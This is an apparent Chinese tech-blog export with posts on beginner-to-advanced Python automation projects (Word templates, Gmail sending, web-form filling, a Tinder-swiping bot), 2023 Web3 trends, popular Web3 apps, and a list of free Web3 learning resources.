<p>您不仅可以通过实现您已经知道的知识来学习更多 Python，而且最终，您可以看到所有的辛勤工作是如何得到回报的。</p>
<span id="more"></span>

<p>最近，由于我没有时间，我经常将任务自动化。多亏了这一点，我有了 5 个新项目，我将它们分为初级、中级和高级。</p>
<p>您将找到解决每个项目的完整脚本和教程的链接。另外，我给他们每个人留下一个挑战来测试你的 Python 技能。</p>
<h2 id="1-自动化-Microsoft-Word（初学者项目）"><a href="#1-自动化-Microsoft-Word（初学者项目）" class="headerlink" title="1. 自动化 Microsoft Word（初学者项目）"></a>1. 自动化 Microsoft Word（初学者项目）</h2><p>您必须使用 Word 多少次来创建求职信、合同协议、简历或报告？</p>
<p>如果你数不清，这个项目是给你的。</p>
<p>在这个项目中，我们将使用 Python 和一个名为<code>docxtpl</code>. 为此，我们需要一个要自动化的文档模板。在模板中，我们必须在以后要替换的每个单词上引入占位符。我们使用<code>&#123;&#123;&#125;&#125;</code>占位符的符号。</p>
<p>为了让事情变得更容易，我已经为求职信创建了一个模板。这是我们将使用的模板的外观。</p>
<p>为了让这个项目对初学者友好，我们只需要使用 Python 和<code>docxtpl</code>.</p>
<p>在下面的视频中，您可以下载此模板，获取脚本，然后按照步骤解决此项目。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly95b3V0dS5iZS9IOEFyczE1d0dSTQ==">视频地址<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>挑战</strong>：如果您想将此项目提升到一个新的水平，请尝试从 Excel 文件中提取数据并将其引入 Word 模板中。</p>
<p>上面教程的第二部分有一个如下表所示的 Excel 文件。</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+--------+-----+------------+----------------+ </span><br><span class="line">|<span class="string"> 姓名   </span>|<span class="string"> ... </span>|<span class="string"> 地址       </span>|<span class="string"> 工作      </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+--------+-----+------------+----------------+ </span></span><br><span class="line"><span class="string"></span>|<span class="string"> 弗兰克 </span>|<span class="string"> ... </span>|<span class="string"> 123 大道   </span>|<span class="string"> 数据科学家 </span>|<span class="string"> </span></span><br><span class="line"><span class="string"></span>|<span class="string"> ...   </span>|<span class="string"> ... </span>|<span class="string"> ...       </span>|<span class="string"> ...       </span>|<span class="string"> </span></span><br><span class="line"><span class="string"></span>|<span class="string"> 约翰   </span>|<span class="string"> ... </span>|<span class="string"> XYZ 大道   </span>|<span class="string"> 网页开发者 </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+--------+-----+------------+----------------+</span></span><br></pre></td></tr></table></figure>

<p>您应该为表格的每一行生成一个新文档。</p>
<h2 id="2-自动发送电子邮件（初学者项目）"><a href="#2-自动发送电子邮件（初学者项目）" class="headerlink" title="2. 自动发送电子邮件（初学者项目）"></a>2. 自动发送电子邮件（初学者项目）</h2><p>我以前在工作中做的最无聊的任务之一就是发送电子邮件。</p>
<p>重要的电子邮件应该被仔细阅读和回复，但是作为日常生活一部分的电子邮件应该是自动化的！这就是这个初学者项目的全部内容。我们将使用 Python 自动发送电子邮件。</p>
<p>如何自动化这个任务？我们只需要使用内置模块<code>smtplib</code>和<code>email</code>. 我们需要<code>smtplib</code>使用简单邮件传输协议 (SMTP) 发送电子邮件，以及<code>email</code>读取、写入和发送更复杂的 MIME 消息的包。</p>
<p>下面是使用 Gmail 自动发送电子邮件的分步教程。以下是它涵盖的内容：</p>
<ul>
<li>如何打开两步验证以便能够在 Python 中使用 Gmail</li>
<li>如何使用 Python 发送普通电子邮件</li>
<li>如何处理您可能遇到的 SSL 错误</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly95b3V0dS5iZS9nX2o2SUxULVgwaw==">视频地址<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>挑战</strong>：如果您想让这个项目更具挑战性，请尝试将图像附加到您的电子邮件中。为此，您需要使用该<code>imghdr</code>库。</p>
<h2 id="3-自动填写-Web-表单（中级项目）"><a href="#3-自动填写-Web-表单（中级项目）" class="headerlink" title="3. 自动填写 Web 表单（中级项目）"></a>3. 自动填写 Web 表单（中级项目）</h2><p>互联网上最繁琐的任务之一是填写网络表格。</p>
<p>我的意思是！一遍又一遍地填写你的姓名、电话号码、地址和更多信息很无聊。当您必须拿出虚假数据来填写调查时，情况会变得更糟。</p>
<p>在这个中间项目中，我们将使用 Python 将假数据填充到 Web 表单中。如何自动化这个任务？我们将使用一个 Web 自动化库，它允许我们执行 Web 操作，例如访问网站、输入文本和单击按钮。</p>
<p>下面有一个关于如何使用 Python 自动执行这项繁琐任务的分步教程。以下是它涵盖的内容：</p>
<ul>
<li>如何在一个表格中填写数据</li>
<li>如何使用 faker 库生成虚假数据</li>
<li>如何填写多个网络表格</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly95b3V0dS5iZS9MUTByX3ZzZHFRdw==">视频地址<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>挑战</strong>：我们在本教程中填写的表格具有简单的元素。如果您想让这个项目更具挑战性，请在表单中添加高级元素，例如下拉菜单和多项选择题。然后尝试自动化这个高级表单。</p>
<h2 id="4-自动化火种（高级项目）"><a href="#4-自动化火种（高级项目）" class="headerlink" title="4. 自动化火种（高级项目）"></a>4. 自动化火种（高级项目）</h2><p>在约会应用程序上向右滑动非常耗时，以至于一旦你找到匹配项，你就会在网上约会最重要的部分变得懒惰——将匹配项转换为实际约会！</p>
<p>这个高级项目包括创建一个适合您滑动的机器人，以便您以后可以处理您的取货线路并提高您的转化率。</p>
<p>是什么让这个项目如此先进？很多东西。仅举几例：</p>
<ul>
<li>登录：无论您使用什么登录选项（Google、Facebook），Tinder 都会向您的电话号码发送一个代码。您需要使用此代码登录 Tinder。为了轻松解决这个问题，我们需要保持 Google Chrome 会话处于活动状态，然后使用 Selenium 控制它。</li>
<li>棘手的按钮：如果您使用该<code>.click</code>方法单击“赞”按钮，有时可能会出错。对于这个特定的网站，我们需要使用替代方案。</li>
<li>弹出窗口：向右滑动时，您可能会遇到不同的弹出窗口。你必须摆脱它们。</li>
</ul>
<p>下面有一个教程可以帮助您处理所有这些问题。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly95b3V0dS5iZS9OSlROZVhvZmJwcw==">视频地址<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>挑战：</strong>让您的机器人向您的比赛发送随机接送线路。</p>
<p>但这只是为了这个项目！如果您想获得更多回复，请不要自动发送消息。我试过了，它不如自己发送高质量的消息有效。</p>
<h2 id="5-在工作中自动化你自己的任务（超级高级项目）"><a href="#5-在工作中自动化你自己的任务（超级高级项目）" class="headerlink" title="5. 在工作中自动化你自己的任务（超级高级项目）"></a>5. 在工作中自动化你自己的任务（超级高级项目）</h2><p>毫无疑问，将工作中繁琐的任务自动化是您能做的最具挑战性的事情。</p>
<p>为什么？很可能没有分步教程来指导您，您必须考虑需要使用什么库以及自动化它的最佳方法。</p>
<p>要找出要自动化的内容，请问自己以下问题：</p>
<ol>
<li>我会一遍又一遍地做哪些任务？</li>
<li>我可以使用 Python 自动化哪些特定部分？</li>
<li>我应该使用哪些 Python 库来自动化这个项目？</li>
</ol>
<p>如果您知道问题 #3 的答案，即使您没有找到有关如何自动执行特定任务的教程，您也可以查看文档或阅读指南以开始使用该库。</p>
<p>在评论中让我知道您现在正在自动化什么任务！</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>2023 年 Web3 的主要趋势</title>
    <url>/2022/11/web3-2023/</url>
    <content><![CDATA[<h2 id="说说新版互联网"><a href="#说说新版互联网" class="headerlink" title="说说新版互联网"></a>说说新版互联网</h2><p>“Web 3.0 或 Web3”一词是以太坊联合创始人 Gavin Wood 在 2014 年创造的，这个想法在 2021 年引起了加密货币爱好者和大型科技公司的兴趣。</p>
<p>Web3 仍在发展和定义中，因此，还没有一个公认的公认定义。然而，帮助传播 Web3 的投资者 Packy McCormick <span class="exturl" data-url="aHR0cHM6Ly9mdXR1cmUuYTE2ei5jb20vd2h5LXdlYjMtbWF0dGVycy8=">将其定义<i class="fa fa-external-link-alt"></i></span>为“<span class="exturl" data-url="aHR0cHM6Ly9mdXR1cmUuY29tL3doeS13ZWIzLW1hdHRlcnMv">构建者和用户拥有的互联网，用代币精心策划<i class="fa fa-external-link-alt"></i></span>”。</p>
<span id="more"></span>

<p>Web3 的概念可能既令人费解又模糊，为了帮助理解，这里是对多年来互联网发展的快速回顾：</p>
<ul>
<li><strong>Web 1.0</strong> — 静态 Web（大约 1990-2005 年）。它由只读网页组成，总的来说，这些网页缺乏很多交互功能。内容生成有限，信息很难找到。</li>
<li><strong>Web 2.0</strong> — 动态网络（大约从 2004 年开始）。由基于网络构建的新软件应用程序组成。大部分价值来自谷歌、苹果、亚马逊和 Facebook 等公司。</li>
</ul>
<p>Web3 的愿景往往是当今在线和数字作品的更民主的版本，其中 Web3 平台可以为创作者和用户提供一种通过他们的活动和贡献获利的方法。例如，PIXIE 是 TikTok 或 Instagram 的加密版本，使用加密货币 PIX 奖励所有社交互动，这被称为“社交内容挖掘”。</p>
<p>Web3 的演化路径有很多种，但行业意见领袖通常会提出以下特征来帮助定义 Web3：</p>
<ul>
<li><strong>语义网：</strong>增强的网络技术，允许用户通过搜索和分析创建和共享链接材料。Web3 的搜索和分析功能将更侧重于理解单词的含义及其背后的上下文。</li>
<li><strong>去中心化</strong>：与 Web 1.0 和 Web 2.0 不同，在 Web 1.0 和 Web 2.0 中，治理和应用程序在很大程度上是集中的（想想 Facebook&#x2F;Meta），Web3 将是去中心化的，所有应用程序和服务都通过没有中央权威的分布式方法启用。</li>
<li><strong>3D 图形或 Metaverse：</strong>一些技术专家提到 Web3 是因为它有可能在物理世界和虚拟世界或 Metaverse 之间创造一个新的沉浸和交互水平。从游戏、健康、房地产和电子商务等所有行业都可以看到开创性的应用程序。</li>
<li><strong>人工智能：</strong>语义能力和人工智能的结合将显着改进对大量数据的理解，并提供更快、更相关的结果（例如，气候预测或基于人为的腐败行为，如有偏见的产品评论）。</li>
</ul>
<p>Web3 的其他功能包括无处不在（即任何地方&#x2F;每个地方）、区块链（即去中心化分类账）和边缘计算。</p>
<h2 id="2023-年-Web3-的主要趋势"><a href="#2023-年-Web3-的主要趋势" class="headerlink" title="2023 年 Web3 的主要趋势"></a>2023 年 Web3 的主要趋势</h2><p>随着 Web3 拥抱这些功能，并继续使用区块链、加密货币和 NFT 以所有权的形式将权力还给用户，我们继续看到许多公司使用这项技术来增强他们的品牌。</p>
<p>以下是 2023 年需要关注的一些 Web3 关键趋势。</p>
<h2 id="行业将更加重视网络安全"><a href="#行业将更加重视网络安全" class="headerlink" title="行业将更加重视网络安全"></a>行业将更加重视网络安全</h2><p>Web3 为用户提供了多项好处，例如数据所有权、透明度和更少的中介，但它引起了人们对新的安全威胁的担忧。一些示例包括智能合约逻辑黑客、加密货币劫持、地毯拉取和冰上网络钓鱼。</p>
<p>区块链安全将继续看到巨大的需求，这是加密损失增加的结果。<span class="exturl" data-url="aHR0cHM6Ly9kZWNyeXB0LmNvLzEwMjA4MC9yb3VnaGx5LTcwLW9mLTEtYmlsbGlvbi1sb3N0LXRvLWNyeXB0by1zY2FtbWVycy1zaW5jZS0yMDIxLXdhcy1iaXRjb2luLWZ0Yw==">美国联邦贸易委员会2022 年的一份报告<i class="fa fa-external-link-alt"></i></span>显示，自 2021 年以来，超过 46,000 人因加密货币诈骗损失超过 10 亿美元。领先的加密货币做市商 Wintermute 最近在一次黑客攻击中损失了约<span class="exturl" data-url="aHR0cHM6Ly90ZWNoY3J1bmNoLmNvbS8yMDIyLzA5LzIwL2NyeXB0by1tYXJrZXQtbWFrZXItd2ludGVybXV0ZS1sb3Nlcy0xNjAtbWlsbGlvbi1pbi1kZWZpLWhhY2sv">1.6 亿美元<i class="fa fa-external-link-alt"></i></span>，成为最新的公司之一。行业遭受破坏。</p>
<p>与加密货币一起，NFT 也越来越成为诈骗者的<span class="exturl" data-url="aHR0cHM6Ly9kZWNyeXB0LmNvLzEwNjAyNC9uZnQtcHJvamVjdHMtbG9zdC0yMm0tdG8taGFja2Vycy1pbi1vbmUtbW9udGgtdmlhLWRpc2NvcmQtcmVwb3J0">热门<i class="fa fa-external-link-alt"></i></span>目标。</p>
<p>随着对该领域的关注度越来越高，越来越多的初创公司开始为 Web3 开发安全、数据、监控和存储解决方案，并且这一趋势被越来越多的行业投资所观察到：</p>
<ul>
<li><a href="https://immunefi.com/"><strong>Immunefi</strong></a><strong>：</strong> DeFi的漏洞赏金和安全服务平台已筹集 2400 万美元作为其 A 系列的一部分。</li>
<li><a href="https://uk.movies.yahoo.com/certik-leading-web3-security-company-120000272.html"><strong>CertiK</strong></a><strong>：</strong>一家领先的Web3 安全公司在今年早些时候的 B3 轮融资中筹集了 8800 万美元。</li>
<li><a href="https://halborn.com/web3-security-firm-halborn-raises-90m-series-a-led-by-summit-partners/"><strong>Halborn</strong></a><strong>：</strong>一家为传统金融和基于区块链的客户提供服务的网络安全公司，在其 A 轮融资中筹集了 9000 万美元。</li>
</ul>
<p>更多投资和强调使 Web3 体验尽可能安全将有助于减少诈骗，并使公司更愿意投资与 Web3 相关的项目。</p>
<h2 id="元界投资和并购交易将推动市场增长"><a href="#元界投资和并购交易将推动市场增长" class="headerlink" title="元界投资和并购交易将推动市场增长"></a>元界投资和并购交易将推动市场增长</h2><p>Web3 空间将继续吸引由两种力量驱动的投资：与元宇宙相关的项目和元宇宙的并购交易。</p>
<p>仅在 2022 年的前五个月，就有超过<span class="exturl" data-url="aHR0cHM6Ly93d3cubWNraW5zZXkuY29tL2Fib3V0LXVzL25ldy1hdC1tY2tpbnNleS1ibG9nL21lZXQtdGhlLW1ldGF2ZXJzZS1jcmVhdGluZy1yZWFsLXZhbHVlLWluLWEtdmlydHVhbC13b3JsZA==">1200 亿美元<i class="fa fa-external-link-alt"></i></span>的投资用于构建元宇宙技术和基础设施，是 2021 年 570 亿美元投资的两倍多。</p>
<p>有几个原因会引起投资者和品牌的兴趣：</p>
<ul>
<li>越来越关注使用<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ3JhbmR2aWV3cmVzZWFyY2guY29tL2luZHVzdHJ5LWFuYWx5c2lzL21peGVkLXJlYWxpdHktbWFya2V0">混合现实<i class="fa fa-external-link-alt"></i></span>(MR)、<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ3JhbmR2aWV3cmVzZWFyY2guY29tL2luZHVzdHJ5LWFuYWx5c2lzL2F1Z21lbnRlZC1yZWFsaXR5LW1hcmtldA==">增强现实<i class="fa fa-external-link-alt"></i></span>(AR) 和<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ3JhbmR2aWV3cmVzZWFyY2guY29tL2luZHVzdHJ5LWFuYWx5c2lzL3ZpcnR1YWwtcmVhbGl0eS12ci1tYXJrZXQ=">虚拟现实<i class="fa fa-external-link-alt"></i></span>(VR) 整合数字世界和物理世界。</li>
<li>Metaverse 有潜力以多种方式提升多个行业，例如制造业（例如，数字原型）、酒店和旅游业（例如，预览和提升客户体验）和医疗保健（例如，加速疾病评估和治疗）。</li>
<li>游戏、内容创作、社交、学习、培训等用户渗透率高。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0ByaXRhYmF0YWxoYS9ob3ctdGhlLW1ldGF2ZXJzZS1jYW4tc2hhcGUtY3VzdG9tZXItZXhwZXJpZW5jZS0yMDVlZWM4NjQ3NjE=">转变电子商务和客户体验。<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>因此，Meta、Gucci、Nike、Starbucks 和 Adidas 等各种终端用户玩家正以不同的方式进入元宇宙，以尝试不同的方式来提升客户的互联网体验。</p>
<p><a href="https://techcrunch.com/2022/08/03/starbucks-to-unveil-its-web3-based-rewards-program-next-month/"><strong>星巴克</strong></a>将推出支持Web3 的忠诚度计划和非同质化代币 (NFT) 平台，让客户能够赚取和购买数字资产，从而获得独家体验和奖励。</p>
<p>随着元宇宙和 NFT 的持续飙升，将会出现更多的并购机会，以加速构建沉浸式体验，并帮助构建以引人入胜的内容为基础的大规模社区。博彩是最大的赌注之一。</p>
<p>过去 18 个月，元界并购总额<span class="exturl" data-url="aHR0cHM6Ly90ZWNobW9uaXRvci5haS90ZWNobm9sb2d5L2VtZXJnaW5nLXRlY2hub2xvZ3kvbWV0YXZlcnNlLW1lcmdlcnMtYWNxdWlzaXRpb25zLWludmVzdGluZy12aXJ0dWFs">达 770 亿美元<i class="fa fa-external-link-alt"></i></span>，买家主要关注视频游戏、增强现实、虚拟现实和 3D 解决方案。</p>
<p>品牌和投资者还将获得新服务，以确保并购交易成为<span class="exturl" data-url="aHR0cHM6Ly9yaXRhYmF0YWxoYS5tZWRpdW0uY29tL3RvcC10cmVuZHMtZm9yLXdlYjMtaW4tMjAyMy1lOWZkNmUwZmJjMzAjX21zb2NvbV8x">[Cc1]<i class="fa fa-external-link-alt"></i></span>。例如，<a href="https://acquire.fi/"><strong>Acquire.Fi</strong></a>是一家 Web3 公司和并购平台，在收购过程的所有阶段提供尽职调查、业务评估和支持。</p>
<h2 id="最后的想法"><a href="#最后的想法" class="headerlink" title="最后的想法"></a>最后的想法</h2><p>Web3 仍然是一个新颖的概念，但尖端技术将有可能彻底改变行业和日常生活的一部分。</p>
<p>网络安全将成为 2023 年的最大趋势之一，这在一定程度上是加密货币和 NFT 骗局的结果。另一个将继续引发争论的挑战是在权力下放和监管之间找到平衡。例如，智能合约中的黑客攻击引发了关键的法律问题，因为它们通常不受法律保护或分散在各个司法管辖区。</p>
<p>尽管如此，随着元宇宙相关项目和并购交易的投资不断增加，该行业有望继续蓬勃发展。到 2030 年， Metaverse 市场规模预计将达到<span class="exturl" data-url="aHR0cHM6Ly93d3cucHJuZXdzd2lyZS5jb20vbmV3cy1yZWxlYXNlcy9tZXRhdmVyc2UtbWFya2V0LXNpemUtd29ydGgtLTgyNC01My1iaWxsaW9uLWdsb2JhbGx5LWJ5LTIwMzAtYXQtMzktMS1jYWdyLXZlcmlmaWVkLW1hcmtldC1yZXNlYXJjaC0zMDE1ODU3MjUuaHRtbCM6fjp0ZXh0PUFjY29yZGluZyUyMHRvJTIwVmVyaWZpZWQlMjBNYXJrZXQlMjBSZXNlYXJjaCwzOS4xJTI1JTIwZnJvbSUyMDIwMjIlMjB0byUyMDIwMzAu">8245.3 亿美元<i class="fa fa-external-link-alt"></i></span>，从 2022 年到 2030 年将增长 39.1%，为品牌提供更多从客户体验、忠诚度和购物转变业务功能的机会。</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Web3</tag>
      </tags>
  </entry>
  <entry>
    <title>Web3 的 10 大应用</title>
    <url>/2022/11/web3-application/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Web3 总是很热。在比特币和以太坊成功之后。一批新的Web3应用层出不穷。有人认为 Web3 只是一个概念。对于Web3技术，不同的人有不同的理解。</p>
<p>实际上，Web3 是一种去中心化的分布式技术。用户对其内容和创意拥有完全的权利。用户可以在钱包的帮助下访问该应用程序。以下是 Web3 应用程序中最流行的应用程序。</p>
<span id="more"></span>

<h2 id="Metamask"><a href="#Metamask" class="headerlink" title="Metamask"></a>Metamask</h2><p>最知名的用于存储和传输的加密钱包。Metamask 不仅提供货币存储功能，还提供 Web3 应用程序中的数字身份。Metamask 为私有财产和个人信息提供数字身份。所有信息和用户活动详细信息始终存储在不可变的区块链上。</p>
<h2 id="Brave-browser"><a href="#Brave-browser" class="headerlink" title="Brave browser"></a>Brave browser</h2><p>浏览器是互联网上最重要的软件。对于互联网浏览，隐私安全是最重要的问题。Brave 的主题是为每一位用户提供隐私保护。与其他浏览器相比，brave 赋予其用户通过观看广告赚钱的权利。</p>
<h2 id="The-Graph"><a href="#The-Graph" class="headerlink" title="The Graph"></a>The Graph</h2><p>该图就像谷歌或必应搜索引擎。The Graph 是一个去中心化的区块链数据索引系统。Graph 提供基于 Web3 生态的查询 API 服务层。但是 Graph 和 Google 的区别在于它是为 Web3 开发者设计的，而不是为普通用户设计的。</p>
<h2 id="StepN"><a href="#StepN" class="headerlink" title="StepN"></a>StepN</h2><p>运行时提供收入方法的 Web3 应用程序。有了这个应用程序，用户可以改善他们的健康状况并获得一举一动的奖励。例如，配备 NFT Sneakers 的用户移动到户外并将他们的旅行隐蔽到代币和其他 NFT 奖励。</p>
<h2 id="APPICS-the-Instagram-of-Web3"><a href="#APPICS-the-Instagram-of-Web3" class="headerlink" title="APPICS the Instagram of Web3"></a>APPICS the Instagram of Web3</h2><p>它是一个社交应用程序，提供由项目的原生代币组成的奖励池。奖励池将代币分配给参与的用户。如果一些用户为平台贡献了更多价值，奖励池将为他们提供最大的贡献激励。</p>
<h2 id="Sound-XYZ-Audio"><a href="#Sound-XYZ-Audio" class="headerlink" title="Sound.XYZ &amp; Audio"></a>Sound.XYZ &amp; Audio</h2><p>这两个 Web3 平台都为音乐内容创作者提供服务。例如，Sound.XYZ 为该人将创建的每首歌曲提供 25 到 1000 个 NFT。艺术家可以从他们的音乐作品中获得100%的收入，以及每个二级市场转售费的10%。音频使音乐家可以更好地控制他们如何营销他们的音乐并帮助他们与粉丝互动。</p>
<h2 id="Mirror-XYZ"><a href="#Mirror-XYZ" class="headerlink" title="Mirror.XYZ"></a>Mirror.XYZ</h2><p>它就像 Web3 上的 Medium 应用程序。为发表文章、众筹、数字收藏、拍卖、贡献分发和社区投票提供支持。</p>
<h2 id="Doge-Art-Club-NFT-https-www-dogeartclub-com"><a href="#Doge-Art-Club-NFT-https-www-dogeartclub-com" class="headerlink" title="Doge Art Club NFT (https://www.dogeartclub.com/)"></a>Doge Art Club NFT (<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG9nZWFydGNsdWIuY29tLw==">https://www.dogeartclub.com/<i class="fa fa-external-link-alt"></i></span>)</h2><p>如果您爱您的狗，请加入此 Web3 应用程序。此应用程序中的每个部分都会引导用户了解 Doge 的爱和感受。每个 Doge Art Club NFT 都有一个推荐代码，您可以使用您的代码获得任何铸币厂价值的 30%。</p>
<h2 id="Reboot-Cult-https-rebootcult-com"><a href="#Reboot-Cult-https-rebootcult-com" class="headerlink" title="Reboot Cult (https://rebootcult.com)"></a>Reboot Cult (<span class="exturl" data-url="aHR0cHM6Ly9yZWJvb3RjdWx0LmNvbS8=">https://rebootcult.com<i class="fa fa-external-link-alt"></i></span>)</h2><p>这个 Web3 应用程序与艺术家、时装设计师、活动组织者和博物馆展示合作，以展示 NFT 艺术画廊。Web3 应用程序提供了对文化充满热爱的社区驱动产品。此应用程序帮助用户成长，并访问 NFT 行业的社区。</p>
<h2 id="Cosmos-https-cosmos-network"><a href="#Cosmos-https-cosmos-network" class="headerlink" title="Cosmos (https://cosmos.network)"></a>Cosmos (<span class="exturl" data-url="aHR0cHM6Ly9jb3Ntb3MubmV0d29yay8=">https://cosmos.network<i class="fa fa-external-link-alt"></i></span>)</h2><p>这个 Web3 应用程序展示了 Web3 网站设计趋势，例如我们在整个行业中看到的生动渐变、3D 功能和科幻主题。</p>
<h2 id="Theta-https-www-iota-org"><a href="#Theta-https-www-iota-org" class="headerlink" title="Theta (https://www.iota.org)"></a>Theta (<span class="exturl" data-url="aHR0cHM6Ly93d3cuaW90YS5vcmcv">https://www.iota.org<i class="fa fa-external-link-alt"></i></span>)</h2><p>这个 Web2 应用程序允许人们了解他们想了解的有关 IOTA 的所有信息。这个 Web3 应用程序重组了分布式账本技术，以允许资金和数据的自由和安全流动。</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Web3</tag>
      </tags>
  </entry>
  <entry>
    <title>19 个很棒的免费 Web3 资源，会让你大吃一惊</title>
    <url>/2022/11/web3-library/</url>
    <content><![CDATA[<h2 id="元界、Web3、DeFi-等相关技术资源。"><a href="#元界、Web3、DeFi-等相关技术资源。" class="headerlink" title="元界、Web3、DeFi 等相关技术资源。"></a>元界、Web3、DeFi 等相关技术资源。</h2><p>我正在学习更多关于 web3 的知识。我相信 web3 技术在未来会相当重要。这就是为什么我试图更多地了解它。</p>
<p>在这个令人难以置信的过程中，我学到的一切，我都会与大家分享。</p>
<span id="more"></span>

<p>以下是我已经与您分享的一些资源。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9qYXZhc2NyaXB0LnBsYWluZW5nbGlzaC5pby8xNC1pbnNhbmVseS1mcmVlLXdlYjMtdHV0b3JpYWxzLXlvdWxsLWV2ZXItZmluZC1vbi10aGUtaW50ZXJuZXQtbm8tYnMtN2UwN2U4NjkwY2Vk">14 个免费教程让你开始使用 Web3<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9qYXZhc2NyaXB0LnBsYWluZW5nbGlzaC5pby93ZWIzLXZvY2FidWxhcnkteW91LXNob3VsZC1iZS1hd2FyZS1vZi0yZTg4NmMwNmE3MjE=">你应该知道的 Web3 词汇<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9qYXZhc2NyaXB0LnBsYWluZW5nbGlzaC5pby9pdmUtd2F0Y2hlZC10b25uZXMtb2Ytd2ViMy15b3V0dWJlLXZpZGVvcy1oZXJlLWFyZS10aGUtdG9wLTUtdG8tZ2V0LXlvdS1nb2luZy1jYTM1ZTdkN2UzYjE=">我看过无数的 Web3 YouTube 视频；这是让您前进的前 5 名<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9qYXZhc2NyaXB0LnBsYWluZW5nbGlzaC5pby9oYW5keS1yZXNvdXJjZXMtdGhhdC1ldmVyeS13ZWIzLWRldmVsb3Blci1zaG91bGQtYmUtYXdhcmUtb2YtNzc2ZjBmY2QxNmVh">每个 Web3 开发人员都应该知道的便利资源<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>现在，我将与您分享一些您以前从未听说过的疯狂资源。<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9fYWxleGJyb2dhbg==">Alex Brogan<i class="fa fa-external-link-alt"></i></span>的这篇文章值得称赞，因为他在 Twitter 上分享了所有这些很棒的链接。</p>
<blockquote>
<p><strong>注意：</strong>这篇文章中没有与任何资源相关的附属链接。我已经使用了所有这些并发现它们很有价值，这就是为什么我想与您分享它们。甚至我也没有因为撰写所有这些资源而得到补偿（附属）。</p>
</blockquote>
<p>让我们开始吧。</p>
<ol>
<li><a href="https://www.matthewball.vc/the-metaverse-primer"><strong>Matthew Ball 的元宇宙入门</strong></a></li>
</ol>
<p>因为马克扎克伯格，我们都听说过很多关于元宇宙这个词。但我们大多数人都不知道它是什么或它将如何影响我们的未来。</p>
<p>如果您想了解更多信息，<span class="exturl" data-url="aHR0cHM6Ly93d3cubWF0dGhld2JhbGwudmMvdGhlLW1ldGF2ZXJzZS1wcmltZXI=">此<i class="fa fa-external-link-alt"></i></span>资源将为您提供帮助。</p>
<p>它涵盖了您需要了解的有关元界和相关技术的所有信息。</p>
<ol start="2">
<li><a href="https://teachyourselfcrypto.com/"><strong>自学加密</strong></a></li>
</ol>
<p>您将在一个资源中发现您需要了解的所有信息。将涵盖 IPFS、Aave、Yield Farming、多链协议和桥接器以及更多主题。</p>
<ol start="3">
<li><a href="https://a16zcrypto.com/wp-content/uploads/2022/05/state-of-crypto-2022_a16z-crypto.pdf"><strong>A16Z Crypto 的 2022 年加密货币状态</strong></a></li>
</ol>
<p>您可能听说过 A16Z Crypto，这是一家投资加密货币和 web3 业务的风险投资公司。</p>
<p>他们为 web3 新手创建了最用户友好的教程。</p>
<ol start="4">
<li><a href="http://web3starterpack.xyz/"><strong>Web3 入门包</strong></a></li>
</ol>
<p>一个 Web3 入门包，可以教您需要知道的一切。</p>
<p>Web3、DAO、NFT、DeFi 解释简单易懂。</p>
<ol start="5">
<li><a href="https://thedailyape.notion.site/thedailyape/The-Daily-Ape-c96c0b6727c0433a962e897ef43efb7e"><strong>猿猴日报</strong></a></li>
</ol>
<p>互联网对加密货币每个部分最彻底的管理之一（完全免费）。</p>
<p>这对您来说是宝贵的资源。</p>
<ol start="6">
<li><a href="https://gabygoldberg.notion.site/f7050e62461143d49345e7b46eb5576b?v=c02511c4230c44ce9a1a03c9757da524"><strong>Gaby 的 Web3 阅读清单</strong></a></li>
</ol>
<p>Gaby Goldberg（一名 web3 专业人士）专门为您整理了一系列<span class="exturl" data-url="aHR0cHM6Ly9nYWJ5Z29sZGJlcmcubm90aW9uLnNpdGUvZjcwNTBlNjI0NjExNDNkNDkzNDVlN2I0NmViNTU3NmI/dj1jMDI1MTFjNDIzMGM0NGNlOWExYTAzYzk3NTdkYTUyNA==">web3 文章。<i class="fa fa-external-link-alt"></i></span></p>
<ol start="7">
<li><a href="https://twitter.com/hey_bernie/status/1496508644132900868"><strong>关于 Web3 的最佳通讯</strong></a></li>
</ol>
<p>到目前为止，我已经订阅了各种时事通讯，涵盖的主题包括商业、创业、Web 开发、技术以及现在的 Web3。</p>
<p>如果您正在寻找最好的 web3 时事通讯，<span class="exturl" data-url="aHR0cHM6Ly9nYWJ5Z29sZGJlcmcubm90aW9uLnNpdGUvZjcwNTBlNjI0NjExNDNkNDkzNDVlN2I0NmViNTU3NmI/dj1jMDI1MTFjNDIzMGM0NGNlOWExYTAzYzk3NTdkYTUyNA==">这个<i class="fa fa-external-link-alt"></i></span>Twitter 线程可以提供帮助。</p>
<ol start="8">
<li><a href="https://immersionden.xyz/"><strong>沉浸室</strong></a></li>
</ol>
<p>另一个供您获取的详尽资源。</p>
<ol start="9">
<li><a href="https://creatoreconomy.so/p/curious-beginner-guide-to-crypto"><strong>好奇的加密初学者指南</strong></a></li>
</ol>
